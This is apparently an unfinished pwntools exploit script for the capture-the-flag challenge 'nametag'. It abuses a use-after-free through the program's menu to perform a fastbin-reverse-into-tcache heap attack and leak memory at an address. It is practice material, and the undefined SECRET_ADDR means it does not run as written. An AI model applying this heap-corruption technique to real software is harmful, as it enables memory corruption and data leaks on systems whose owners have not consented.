from pwn import *

exe = ELF("./nametag_patched")
libc = ELF("./libc.so.6")

context.binary = exe

HOST = "tcp.flagyard.com"
PORT = 13682

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def add_name(r, idx):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(idx).encode())

def edit_name(r, idx, name):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", name)

def delete_name(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(idx).encode())

def show_name(r, idx):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", str(idx).encode())
    r.recvuntil(b"Name: ")

    return r.recvline()

def empty_tcache(r, n):
    for i in range(n):
        add_name(r, i)

def fill_tcache(r, n):
    empty_tcache(r, n)

    for i in range(n):
        delete_name(r, i)

def fastbin_reverse_into_tcache(r, heap):
    fill_tcache(r, 14)
    edit_name(r, 7, pack(SECRET_ADDR))
    empty_tcache(r, 7)

    add_name(r, 0)
    add_name(r, 1)
    print(show_name(r, 1))

def main():
    r = conn()
    fastbin_reverse_into_tcache(r, 0)
    r.interactive()

if __name__ == "__main__":
    main()
